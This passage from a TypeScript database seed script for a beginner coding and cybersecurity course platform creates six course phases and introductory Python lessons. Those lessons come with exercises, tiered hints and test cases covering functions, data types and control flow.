import { db } from '../src/lib/db'
import { hash } from 'bcryptjs'

// ============================================================
// ZERO TO DEV - CS & CYBERSECURITY MASTERY PLATFORM
// Comprehensive Database Seed Script
// ============================================================

async function main() {
  console.log('🚀 Zero to Dev — Seeding database...\n')

  // ----------------------------------------------------------
  // 0. CLEAR EXISTING DATA (respect foreign key order)
  // ----------------------------------------------------------
  console.log('🗑️  Clearing existing data...')

  await db.userAchievement.deleteMany()
  await db.labSession.deleteMany()
  await db.userExerciseAttempt.deleteMany()
  await db.userProgress.deleteMany()
  await db.testCase.deleteMany()
  await db.hint.deleteMany()
  await db.exercise.deleteMany()
  await db.lesson.deleteMany()
  await db.hackingLab.deleteMany()
  await db.achievement.deleteMany()
  await db.session.deleteMany()
  await db.account.deleteMany()
  await db.verificationToken.deleteMany()
  await db.user.deleteMany()
  await db.phase.deleteMany()
  // New models
  await db.portfolioArtifact.deleteMany()
  await db.interviewAttempt.deleteMany()
  await db.interviewProblem.deleteMany()
  await db.assessmentAttempt.deleteMany()
  await db.assessmentProblem.deleteMany()
  await db.assessment.deleteMany()
  await db.projectSubmission.deleteMany()
  await db.project.deleteMany()

  console.log('✅ All existing data cleared.\n')

  // ----------------------------------------------------------
  // 1. CREATE PHASES
  // ----------------------------------------------------------
  console.log('📦 Creating phases...')

  const phases = await Promise.all([
    db.phase.create({
      data: {
        number: 1,
        title: 'Foundations',
        description: 'Build your programming foundation with Python and get your first taste of cybersecurity. Master variables, control flow, and basic security concepts that every developer needs to know.',
        icon: 'Code2',
      },
    }),
    db.phase.create({
      data: {
        number: 2,
        title: 'Data Structures & Algorithms',
        description: 'Strengthen your problem-solving muscles with core data structures and algorithms. From arrays to graphs, you will learn the building blocks that power every software system and security tool.',
        icon: 'GitBranch',
      },
    }),
    db.phase.create({
      data: {
        number: 3,
        title: 'Systems & Networks',
        description: 'Dive into operating systems, networking protocols, and the Linux command line. Understanding how systems communicate is essential for both building software and securing it.',
        icon: 'Server',
      },
    }),
    db.phase.create({
      data: {
        number: 4,
        title: 'Web Security',
        description: 'Explore the OWASP Top 10 and learn to identify, exploit, and patch the most critical web vulnerabilities. This phase transforms you from a developer into a security-aware engineer.',
        icon: 'Shield',
      },
    }),
    db.phase.create({
      data: {
        number: 5,
        title: 'Advanced Security',
        description: 'Master cryptography, digital forensics, and reverse engineering. These advanced skills separate security practitioners from security professionals and prepare you for real-world incident response.',
        icon: 'Lock',
      },
    }),
    db.phase.create({
      data: {
        number: 6,
        title: 'Capstone',
        description: 'Put everything together with real-world projects and CTF challenges. This final phase is your proving ground — solve capture-the-flag problems and demonstrate mastery across all domains.',
        icon: 'Trophy',
      },
    }),
  ])

  console.log(`✅ Created ${phases.length} phases.\n`)

  // ----------------------------------------------------------
  // 2. CREATE LESSONS, EXERCISES, HINTS & TEST CASES
  // ----------------------------------------------------------
  console.log('📚 Creating lessons, exercises, hints, and test cases...')

  // Helper to create a full lesson with exercises
  async function createLessonWithExercises(
    phaseId: string,
    lessonData: {
      title: string
      slug: string
      description: string
      contentMdx: string
      order: number
      xpReward: number
      category: string
      exercises: Array<{
        title: string
        slug: string
        description: string
        starterCode: string
        language: string
        order: number
        xpReward: number
        hints: Array<{ level: number; content: string; xpCost: number }>
        testCases: Array<{ input: string; expectedOutput: string; isHidden: boolean; order: number }>
      }>
    }
  ) {
    const { exercises, ...lessonFields } = lessonData
    const lesson = await db.lesson.create({
      data: {
        ...lessonFields,
        phaseId,
      },
    })

    for (const exData of exercises) {
      const { hints, testCases, ...exFields } = exData
      const exercise = await db.exercise.create({
        data: {
          ...exFields,
          lessonId: lesson.id,
        },
      })

      for (const hint of hints) {
        await db.hint.create({
          data: {
            ...hint,
            exerciseId: exercise.id,
          },
        })
      }

      for (const tc of testCases) {
        await db.testCase.create({
          data: {
            ...tc,
            exerciseId: exercise.id,
          },
        })
      }
    }

    return lesson
  }

  let lessonCount = 0
  let exerciseCount = 0

  // ============================================================
  // PHASE 1: FOUNDATIONS
  // ============================================================

  // Lesson 1.1: Hello, Python
  const lesson1_1 = await createLessonWithExercises(phases[0].id, {
    title: 'Hello, Python',
    slug: 'hello-python',
    description: 'Write your first Python programs and learn how functions work. This lesson introduces the Python interpreter, the print function, and how to define and call your own functions.',
    contentMdx: `# Hello, Python!

Welcome to your very first programming lesson! Python is one of the most popular programming languages in the world — and for good reason. It reads almost like English, which makes it an excellent first language for aspiring developers and cybersecurity professionals alike.

## Why Python?

Python is the **lingua franca** of both software development and cybersecurity. Here is why:

- **Readable syntax**: Python uses indentation instead of braces, making code clean and easy to follow.
- **Massive ecosystem**: From web frameworks (Django, Flask) to security tools (Scapy, PyCryptodome), Python has a library for everything.
- **Industry standard**: Most penetration testing tools, automation scripts, and security utilities are written in Python.

## The \`print()\` Function

The \`print()\` function is your first tool. It outputs text to the console:

\`\`\`python
print("Hello, World!")
\`\`\`

When you run this, Python displays **Hello, World!** on your screen. The quotation marks tell Python that this is a **string** — a sequence of characters.

## Defining Functions

Instead of writing code that runs top-to-bottom, we organize logic into **functions**. A function is a reusable block of code with a name:

\`\`\`python
def greet():
    return "Hello, World!"
\`\`\`

The \`def\` keyword starts a function definition. The **return** statement sends a value back to whoever called the function. This is different from \`print()\`, which merely displays output — \`return\` gives you a value you can store in a variable or use elsewhere.

## Calling Functions

Once defined, you call a function by writing its name followed by parentheses:

\`\`\`python
message = greet()
print(message)  # Output: Hello, World!
\`\`\`

## Functions with Parameters

Functions become truly powerful when they accept **parameters** — inputs that change their behavior:

\`\`\`python
def personal_greet(name):
    return f"Hello, {name}!"

print(personal_greet("Alice"))  # Output: Hello, Alice!
print(personal_greet("Bob"))    # Output: Hello, Bob!
\`\`\`

The \`f"Hello, {name}!"\` syntax is called an **f-string** (formatted string literal). It lets you embed variables directly inside a string by wrapping them in curly braces.

## Key Takeaways

1. **\`print()\`** displays output; **\`return\`** sends a value back to the caller.
2. Functions are defined with **\`def\`** and called with parentheses.
3. **Parameters** make functions flexible and reusable.
4. **F-strings** (\`f"..."\`) let you interpolate variables into strings.

Now it is your turn — write your first functions in the exercises below!`,
    order: 1,
    xpReward: 50,
    category: 'cs',
    exercises: [
      {
        title: 'Hello World Function',
        slug: 'hello-world-function',
        description: 'Write a function called `hello()` that returns the string "Hello, World!". This is the classic first program — every developer writes it at least once!',
        starterCode: `def hello():
    # Return the string "Hello, World!"
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Remember: use the `return` keyword, not `print()`, to send a value back from a function.', xpCost: 5 },
          { level: 2, content: 'Your function should contain exactly: `return "Hello, World!"`', xpCost: 10 },
          { level: 3, content: 'The complete solution is: `def hello(): return "Hello, World!"`', xpCost: 20 },
        ],
        testCases: [
          { input: 'hello()', expectedOutput: 'Hello, World!', isHidden: false, order: 1 },
          { input: 'hello() == "Hello, World!"', expectedOutput: 'True', isHidden: false, order: 2 },
          { input: 'type(hello())', expectedOutput: "<class 'str'>", isHidden: true, order: 3 },
          { input: 'len(hello())', expectedOutput: '13', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Personal Greeting',
        slug: 'personal-greeting',
        description: 'Write a function called `greet(name)` that takes a name as a parameter and returns "Hello, {name}!" where {name} is replaced with the provided name.',
        starterCode: `def greet(name):
    # Return a personalized greeting
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use an f-string to embed the `name` variable into your greeting: `f"Hello, {name}!"`', xpCost: 5 },
          { level: 2, content: 'Your function body should be: `return f"Hello, {name}!"`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def greet(name): return f"Hello, {name}!"`', xpCost: 20 },
        ],
        testCases: [
          { input: 'greet("Alice")', expectedOutput: 'Hello, Alice!', isHidden: false, order: 1 },
          { input: 'greet("Bob")', expectedOutput: 'Hello, Bob!', isHidden: false, order: 2 },
          { input: 'greet("World")', expectedOutput: 'Hello, World!', isHidden: true, order: 3 },
          { input: 'greet("")', expectedOutput: 'Hello, !', isHidden: true, order: 4 },
          { input: 'greet("Zero to Dev")', expectedOutput: 'Hello, Zero to Dev!', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Sum of Two Numbers',
        slug: 'sum-of-two-numbers',
        description: 'Write a function `add(a, b)` that takes two numbers and returns their sum. For example, `add(3, 5)` returns `8`, `add(-1, 1)` returns `0`.',
        starterCode: `def add(a, b):
    # Return the sum of a and b
    pass`,
        language: 'python',
        order: 3,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Simply use the `+` operator to add the two parameters and return the result.', xpCost: 5 },
          { level: 2, content: 'Your function body should be: `return a + b`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def add(a, b): return a + b`', xpCost: 20 },
        ],
        testCases: [
          { input: 'add(3, 5)', expectedOutput: '8', isHidden: false, order: 1 },
          { input: 'add(-1, 1)', expectedOutput: '0', isHidden: false, order: 2 },
          { input: 'add(0, 0)', expectedOutput: '0', isHidden: true, order: 3 },
          { input: 'add(100, 200)', expectedOutput: '300', isHidden: true, order: 4 },
          { input: 'add(-5, -3)', expectedOutput: '-8', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Repeat String',
        slug: 'repeat-string',
        description: 'Write a function `repeat_string(s, n)` that takes a string `s` and an integer `n`, and returns `s` repeated `n` times. For example, `repeat_string("abc", 3)` returns `"abcabcabc"`. If `n` is 0, return an empty string.',
        starterCode: `def repeat_string(s, n):
    # Return s repeated n times
    pass`,
        language: 'python',
        order: 4,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Python supports string multiplication: `"abc" * 3` gives `"abcabcabc"`.', xpCost: 5 },
          { level: 2, content: 'Your function body should be: `return s * n`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def repeat_string(s, n): return s * n`', xpCost: 20 },
        ],
        testCases: [
          { input: 'repeat_string("abc", 3)', expectedOutput: 'abcabcabc', isHidden: false, order: 1 },
          { input: 'repeat_string("hi", 2)', expectedOutput: 'hihi', isHidden: false, order: 2 },
          { input: 'repeat_string("x", 0)', expectedOutput: '', isHidden: true, order: 3 },
          { input: 'repeat_string("a", 5)', expectedOutput: 'aaaaa', isHidden: true, order: 4 },
          { input: 'repeat_string("", 10)', expectedOutput: '', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Temperature Converter',
        slug: 'temperature-converter',
        description: 'Write a function `convert_temp(value, scale)` that takes a numeric temperature value and a string scale (`"C"` for Celsius or `"F"` for Fahrenheit), and returns the converted temperature rounded to 1 decimal place. If scale is `"C"`, convert to Fahrenheit: `F = C * 9/5 + 32`. If scale is `"F"`, convert to Celsius: `C = (F - 32) * 5/9`. For example, `convert_temp(100, "C")` returns `212.0`.',
        starterCode: `def convert_temp(value, scale):
    # Convert temperature between Celsius and Fahrenheit
    # scale is "C" (convert C->F) or "F" (convert F->C)
    pass`,
        language: 'python',
        order: 5,
        xpReward: 25,
        hints: [
          { level: 1, content: 'If scale is "C", apply F = C * 9/5 + 32. If scale is "F", apply C = (F - 32) * 5/9. Use `round(result, 1)` to round to 1 decimal place.', xpCost: 5 },
          { level: 2, content: 'Return `round(value * 9/5 + 32, 1)` if scale == "C" else `round((value - 32) * 5/9, 1)`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def convert_temp(v, s): return round(v * 9/5 + 32, 1) if s == "C" else round((v - 32) * 5/9, 1)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'convert_temp(100, "C")', expectedOutput: '212.0', isHidden: false, order: 1 },
          { input: 'convert_temp(32, "F")', expectedOutput: '0.0', isHidden: false, order: 2 },
          { input: 'convert_temp(0, "C")', expectedOutput: '32.0', isHidden: true, order: 3 },
          { input: 'convert_temp(98.6, "F")', expectedOutput: '37.0', isHidden: true, order: 4 },
          { input: 'convert_temp(-40, "C")', expectedOutput: '-40.0', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'String Formatter',
        slug: 'string-formatter',
        description: 'Write a function `format_info(name, age, city)` that takes three strings and returns a formatted string: `"{name} is {age} years old and lives in {city}."` For example, `format_info("Alice", "25", "Boston")` returns `"Alice is 25 years old and lives in Boston."`.',
        starterCode: `def format_info(name, age, city):
    # Return a formatted sentence using the three parameters
    pass`,
        language: 'python',
        order: 6,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use an f-string to embed the three variables into the template string.', xpCost: 5 },
          { level: 2, content: 'Return `f"{name} is {age} years old and lives in {city}."`', xpCost: 10 },
          { level: 3, content: 'Complete: `def format_info(name, age, city): return f"{name} is {age} years old and lives in {city}."`', xpCost: 20 },
        ],
        testCases: [
          { input: 'format_info("Alice", "25", "Boston")', expectedOutput: 'Alice is 25 years old and lives in Boston.', isHidden: false, order: 1 },
          { input: 'format_info("Bob", "30", "New York")', expectedOutput: 'Bob is 30 years old and lives in New York.', isHidden: false, order: 2 },
          { input: 'format_info("Eve", "99", "Cyber City")', expectedOutput: 'Eve is 99 years old and lives in Cyber City.', isHidden: true, order: 3 },
          { input: 'format_info("", "0", "")', expectedOutput: ' is 0 years old and lives in .', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 6

  // Lesson 1.2: Variables & Data Types
  const lesson1_2 = await createLessonWithExercises(phases[0].id, {
    title: 'Variables & Data Types',
    slug: 'variables-and-data-types',
    description: 'Learn about Python data types — integers, floats, strings, booleans, and more. Understand how to check types and manipulate data.',
    contentMdx: `# Variables & Data Types

Every program works with **data**, and data comes in different **types**. Understanding types is fundamental — it affects how you store, process, and validate information, especially in security contexts where type confusion vulnerabilities exist.

## What Are Variables?

A **variable** is a named container for a value. In Python, you create a variable simply by assigning a value:

\`\`\`python
username = "hacker_one"
score = 42
is_admin = True
\`\`\`

Unlike some languages, Python is **dynamically typed** — you do not declare the type; Python figures it out.

## Core Data Types

| Type | Example | Description |
|------|---------|-------------|
| \`int\` | \`42\` | Whole numbers |
| \`float\` | \`3.14\` | Decimal numbers |
| \`str\` | \`"hello"\` | Text (strings) |
| \`bool\` | \`True\` / \`False\` | Boolean values |
| \`list\` | \`[1, 2, 3]\` | Ordered collection |
| \`dict\` | \`{"key": "val"}\` | Key-value pairs |
| \`None\` | \`None\` | Absence of value |

## The \`type()\` Function

You can inspect any value's type using \`type()\`:

\`\`\`python
print(type(42))         # <class 'int'>
print(type("hello"))    # <class 'str'>
print(type(True))       # <class 'bool'>
print(type([1, 2, 3]))  # <class 'list'>
\`\`\`

This is incredibly useful for debugging and for **input validation** — a critical security practice. Never trust user input without checking its type first!

## Type Conversion

Python lets you convert between types:

\`\`\`python
str(42)      # "42"  — int to string
int("42")    # 42    — string to int
float("3.14") # 3.14 — string to float
bool(0)      # False — zero is falsy
bool(1)      # True  — non-zero is truthy
\`\`\`

## String Operations

Strings are sequences of characters and support powerful operations:

\`\`\`python
name = "Python"
len(name)        # 6 — length
name[0]          # "P" — first character
name[-1]         # "n" — last character
name[::-1]       # "nohtyP" — reversed!
name.upper()     # "PYTHON"
name.lower()     # "python"
\`\`\`

The \`[::-1]\` trick uses **slicing** with a step of -1 to reverse a string. Slicing syntax is \`[start:stop:step]\`.

## Security Connection

Type confusion is a real vulnerability class. If an application expects an integer but receives a string, it might behave unexpectedly. **Always validate and sanitize input types** — this principle applies everywhere from web forms to API endpoints.

In the exercises below, you will write a type checker and a string reverser — two skills that form the bedrock of data validation and manipulation.`,
    order: 2,
    xpReward: 50,
    category: 'cs',
    exercises: [
      {
        title: 'Type Checker',
        slug: 'type-checker',
        description: 'Write a function `check_type(value)` that returns the name of the value\'s type as a string. For example, `check_type(42)` returns `"int"`, `check_type("hello")` returns `"str"`, `check_type(True)` returns `"bool"`, `check_type(3.14)` returns `"float"`, and `check_type(None)` returns `"NoneType"`.',
        starterCode: `def check_type(value):
    # Return the type name as a string (e.g. "int", "str", "bool", "float", "NoneType")
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use `type(value)` to get the type object, then extract its name. The `__name__` attribute of a type object gives you the type name as a string.', xpCost: 5 },
          { level: 2, content: 'Try: `return type(value).__name__`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def check_type(value): return type(value).__name__`', xpCost: 20 },
        ],
        testCases: [
          { input: 'check_type(42)', expectedOutput: 'int', isHidden: false, order: 1 },
          { input: 'check_type("hello")', expectedOutput: 'str', isHidden: false, order: 2 },
          { input: 'check_type(True)', expectedOutput: 'bool', isHidden: true, order: 3 },
          { input: 'check_type(3.14)', expectedOutput: 'float', isHidden: true, order: 4 },
          { input: 'check_type(None)', expectedOutput: 'NoneType', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'String Reverser',
        slug: 'string-reverser',
        description: 'Write a function `reverse_string(s)` that takes a string and returns it reversed. For example, `reverse_string("python")` returns `"nohtyp"`.',
        starterCode: `def reverse_string(s):
    # Return the reversed string
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Python strings support slicing with a step parameter. Try using `s[::-1]` to step through the string backwards.', xpCost: 5 },
          { level: 2, content: 'The slice `s[::-1]` means: start at the end, go to the beginning, stepping -1 each time.', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def reverse_string(s): return s[::-1]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'reverse_string("python")', expectedOutput: 'nohtyp', isHidden: false, order: 1 },
          { input: 'reverse_string("hello")', expectedOutput: 'olleh', isHidden: false, order: 2 },
          { input: 'reverse_string("a")', expectedOutput: 'a', isHidden: true, order: 3 },
          { input: 'reverse_string("")', expectedOutput: '', isHidden: true, order: 4 },
          { input: 'reverse_string("racecar")', expectedOutput: 'racecar', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Even or Odd',
        slug: 'even-or-odd',
        description: 'Write a function `is_even(n)` that takes an integer and returns `True` if it is even, `False` if it is odd. For example, `is_even(4)` returns `True`, `is_even(7)` returns `False`.',
        starterCode: `def is_even(n):
    # Return True if n is even, False if odd
    pass`,
        language: 'python',
        order: 3,
        xpReward: 25,
        hints: [
          { level: 1, content: 'A number is even if it is divisible by 2 with no remainder. Use the modulo operator `%` to check.', xpCost: 5 },
          { level: 2, content: 'Return `n % 2 == 0`. This expression is True for even numbers and False for odd numbers.', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def is_even(n): return n % 2 == 0`', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_even(4)', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_even(7)', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'is_even(0)', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'is_even(-2)', expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'is_even(1)', expectedOutput: 'False', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Count Vowels',
        slug: 'count-vowels',
        description: 'Write a function `count_vowels(s)` that takes a string and returns the number of vowels (a, e, i, o, u) in it, case-insensitive. For example, `count_vowels("Hello")` returns `2`.',
        starterCode: `def count_vowels(s):
    # Return the number of vowels in s (case-insensitive)
    pass`,
        language: 'python',
        order: 4,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Convert the string to lowercase, then iterate through each character and count how many are in the set {"a", "e", "i", "o", "u"}.', xpCost: 5 },
          { level: 2, content: 'Use a comprehension or loop: `sum(1 for c in s.lower() if c in "aeiou")`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def count_vowels(s): return sum(1 for c in s.lower() if c in "aeiou")`', xpCost: 20 },
        ],
        testCases: [
          { input: 'count_vowels("Hello")', expectedOutput: '2', isHidden: false, order: 1 },
          { input: 'count_vowels("AEIOU")', expectedOutput: '5', isHidden: false, order: 2 },
          { input: 'count_vowels("bcdfg")', expectedOutput: '0', isHidden: true, order: 3 },
          { input: 'count_vowels("")', expectedOutput: '0', isHidden: true, order: 4 },
          { input: 'count_vowels("Python is fun")', expectedOutput: '4', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Consonant Counter',
        slug: 'consonant-counter',
        description: 'Write a function `count_consonants(s)` that takes a string and returns the number of consonants (letters that are not vowels) in it, case-insensitive. For example, `count_consonants("Hello")` returns `3` (H, l, l).',
        starterCode: `def count_consonants(s):
    # Return the number of consonants in s (case-insensitive)
    pass`,
        language: 'python',
        order: 5,
        xpReward: 25,
        hints: [
          { level: 1, content: 'A consonant is an alphabetic character that is not a vowel. Check each character: if it is a letter (`c.isalpha()`) and not in "aeiou", count it.', xpCost: 5 },
          { level: 2, content: 'Use: `sum(1 for c in s.lower() if c.isalpha() and c not in "aeiou")`', xpCost: 10 },
          { level: 3, content: 'Complete: `def count_consonants(s): return sum(1 for c in s.lower() if c.isalpha() and c not in "aeiou")`', xpCost: 20 },
        ],
        testCases: [
          { input: 'count_consonants("Hello")', expectedOutput: '3', isHidden: false, order: 1 },
          { input: 'count_consonants("AEIOU")', expectedOutput: '0', isHidden: false, order: 2 },
          { input: 'count_consonants("bcdfg")', expectedOutput: '5', isHidden: true, order: 3 },
          { input: 'count_consonants("Python 3!")', expectedOutput: '5', isHidden: true, order: 4 },
          { input: 'count_consonants("")', expectedOutput: '0', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Type Coercion Predictor',
        slug: 'type-coercion-predictor',
        description: 'Write a function `predict_type(value_str)` that takes a string and determines what type it would become if converted: return `"int"` if it can be parsed as an integer, `"float"` if it can be parsed as a float but not an int, `"bool"` if it is `"True"` or `"False"`, `"NoneType"` if it is `"None"`, or `"str"` otherwise. For example, `predict_type("42")` returns `"int"`, `predict_type("3.14")` returns `"float"`, `predict_type("hello")` returns `"str"`.',
        starterCode: `def predict_type(value_str):
    # Predict the Python type this string would convert to
    pass`,
        language: 'python',
        order: 6,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Check in order: if value_str is "True"/"False" → "bool", if "None" → "NoneType", try int() → "int", try float() → "float", else → "str". Use try/except.', xpCost: 5 },
          { level: 2, content: 'Check bool/None first. Then: `try: int(value_str); return "int" except: try: float(value_str); return "float" except: return "str"`', xpCost: 10 },
          { level: 3, content: 'Complete: chain try/except blocks. Check special string values first, then try int conversion, then float, then default to str.', xpCost: 20 },
        ],
        testCases: [
          { input: 'predict_type("42")', expectedOutput: 'int', isHidden: false, order: 1 },
          { input: 'predict_type("3.14")', expectedOutput: 'float', isHidden: false, order: 2 },
          { input: 'predict_type("True")', expectedOutput: 'bool', isHidden: true, order: 3 },
          { input: 'predict_type("None")', expectedOutput: 'NoneType', isHidden: true, order: 4 },
          { input: 'predict_type("hello")', expectedOutput: 'str', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 6

  // Lesson 1.3: Control Flow
  const lesson1_3 = await createLessonWithExercises(phases[0].id, {
    title: 'Control Flow',
    slug: 'control-flow',
    description: 'Master if/else statements, loops, and conditional logic. These are the building blocks that let your programs make decisions and repeat actions.',
    contentMdx: `# Control Flow

Programs that always do the same thing are boring. **Control flow** lets your code make decisions and repeat actions — it is what makes software intelligent and useful.

## Conditional Statements: \`if\` / \`elif\` / \`else\`

The \`if\` statement evaluates a condition and executes code only when the condition is \`True\`:

\`\`\`python
score = 85

if score >= 90:
    grade = "A"
elif score >= 80:
    grade = "B"
elif score >= 70:
    grade = "C"
else:
    grade = "F"

print(grade)  # Output: B
\`\`\`

Key rules:
- **Indentation matters** — Python uses 4 spaces to define code blocks.
- \`elif\` (else-if) checks additional conditions after the first \`if\`.
- \`else\` catches everything that did not match any condition.

## Boolean Logic

Combine conditions with **and**, **or**, and **not**:

\`\`\`python
is_admin = True
is_active = False

if is_admin and is_active:
    print("Full access granted")
elif is_admin or is_active:
    print("Limited access")
else:
    print("Access denied")
\`\`\`

## Loops: \`for\` and \`while\`

### For Loops

Iterate over a sequence:

\`\`\`python
for i in range(5):
    print(i)  # 0, 1, 2, 3, 4
\`\`\`

\`range(n)\` generates numbers from 0 to n-1. You can also specify a start and step:

\`\`\`python
range(2, 10, 2)  # 2, 4, 6, 8
\`\`\`

### While Loops

Repeat as long as a condition is true:

\`\`\`python
attempts = 0
while attempts < 3:
    attempts += 1
    print(f"Attempt {attempts}")
\`\`\`

**Warning**: Always ensure your while loop will eventually terminate, or you will create an infinite loop!

## The Classic: FizzBuzz

FizzBuzz is the most famous programming interview question:

> For numbers 1 through n, print "Fizz" for multiples of 3, "Buzz" for multiples of 5, "FizzBuzz" for multiples of both, and the number otherwise.

\`\`\`python
def fizzbuzz(n):
    if n % 15 == 0:
        return "FizzBuzz"
    elif n % 3 == 0:
        return "Fizz"
    elif n % 5 == 0:
        return "Buzz"
    else:
        return str(n)
\`\`\`

Note: we check \`n % 15 == 0\` first because 15 is the least common multiple of 3 and 5. If we checked divisibility by 3 first, we would never reach the "FizzBuzz" case.

## Control Flow in Security

Control flow is everywhere in security:
- **Rate limiting**: \`if attempts > max_attempts: block_ip()\`
- **Input validation**: \`if not is_valid(input): reject()\`
- **Brute force protection**: \`while not authenticated and attempts < limit: try_login()\`

Master these patterns, and you will write both more secure code and better security tools.`,
    order: 3,
    xpReward: 50,
    category: 'cs',
    exercises: [
      {
        title: 'FizzBuzz',
        slug: 'fizzbuzz',
        description: 'Write a function `fizzbuzz(n)` that takes an integer n and returns "FizzBuzz" if divisible by both 3 and 5, "Fizz" if divisible by 3 only, "Buzz" if divisible by 5 only, or the number as a string otherwise.',
        starterCode: `def fizzbuzz(n):
    # Return "FizzBuzz", "Fizz", "Buzz", or str(n)
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Check divisibility by 15 first (both 3 and 5), then by 3, then by 5. Use the modulo operator `%` — `n % 3 == 0` means n is divisible by 3.', xpCost: 5 },
          { level: 2, content: 'Structure: `if n % 15 == 0: return "FizzBuzz"` then `elif n % 3 == 0: return "Fizz"` then `elif n % 5 == 0: return "Buzz"` else `return str(n)`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def fizzbuzz(n): return "FizzBuzz" if n%15==0 else "Fizz" if n%3==0 else "Buzz" if n%5==0 else str(n)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'fizzbuzz(3)', expectedOutput: 'Fizz', isHidden: false, order: 1 },
          { input: 'fizzbuzz(5)', expectedOutput: 'Buzz', isHidden: false, order: 2 },
          { input: 'fizzbuzz(15)', expectedOutput: 'FizzBuzz', isHidden: true, order: 3 },
          { input: 'fizzbuzz(7)', expectedOutput: '7', isHidden: true, order: 4 },
          { input: 'fizzbuzz(30)', expectedOutput: 'FizzBuzz', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Palindrome Checker',
        slug: 'palindrome-checker',
        description: 'Write a function `is_palindrome(s)` that takes a string and returns `True` if it is a palindrome (reads the same forwards and backwards), `False` otherwise. Ignore case — treat "Racecar" as a palindrome.',
        starterCode: `def is_palindrome(s):
    # Return True if s is a palindrome (case-insensitive), False otherwise
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Convert the string to lowercase first with `s.lower()`, then compare it to its reverse.', xpCost: 5 },
          { level: 2, content: 'A string is a palindrome if `s.lower() == s.lower()[::-1]`', xpCost: 10 },
          { level: 3, content: 'Complete solution: `def is_palindrome(s): s = s.lower(); return s == s[::-1]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_palindrome("racecar")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_palindrome("python")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'is_palindrome("Racecar")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'is_palindrome("a")', expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'is_palindrome("Madam")', expectedOutput: 'True', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Factorial',
        slug: 'factorial',
        description: 'Write a function `factorial(n)` that takes a non-negative integer and returns its factorial. The factorial of n (written n!) is the product of all positive integers less than or equal to n. By convention, `factorial(0)` returns `1`. For example, `factorial(5)` returns `120`.',
        starterCode: `def factorial(n):
    # Return n! (n factorial)
    pass`,
        language: 'python',
        order: 3,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use a loop from 1 to n, multiplying each number into an accumulator. Start with result = 1.', xpCost: 5 },
          { level: 2, content: 'Initialize `result = 1`, then `for i in range(1, n + 1): result *= i`. Return result.', xpCost: 10 },
          { level: 3, content: 'Complete: `def factorial(n): result = 1; [result := result * i for i in range(1, n+1)]; return result` — or use math.factorial', xpCost: 20 },
        ],
        testCases: [
          { input: 'factorial(5)', expectedOutput: '120', isHidden: false, order: 1 },
          { input: 'factorial(0)', expectedOutput: '1', isHidden: false, order: 2 },
          { input: 'factorial(1)', expectedOutput: '1', isHidden: true, order: 3 },
          { input: 'factorial(3)', expectedOutput: '6', isHidden: true, order: 4 },
          { input: 'factorial(10)', expectedOutput: '3628800', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Collatz Steps',
        slug: 'collatz-steps',
        description: 'Write a function `collatz_steps(n)` that takes a positive integer and returns the number of steps to reach 1 using the Collatz sequence: if n is even, divide by 2; if odd, multiply by 3 and add 1. For example, `collatz_steps(6)` returns `8` (6→3→10→5→16→8→4→2→1).',
        starterCode: `def collatz_steps(n):
    # Return the number of steps to reach 1
    pass`,
        language: 'python',
        order: 4,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use a while loop: while n != 1, apply the rule and increment a counter.', xpCost: 5 },
          { level: 2, content: 'Initialize `steps = 0`. While `n != 1`: if n is even, `n = n // 2`, else `n = 3 * n + 1`. Increment steps each iteration. Return steps.', xpCost: 10 },
          { level: 3, content: 'Complete: `def collatz_steps(n): s=0; while n!=1: n = n//2 if n%2==0 else 3*n+1; s+=1; return s`', xpCost: 20 },
        ],
        testCases: [
          { input: 'collatz_steps(6)', expectedOutput: '8', isHidden: false, order: 1 },
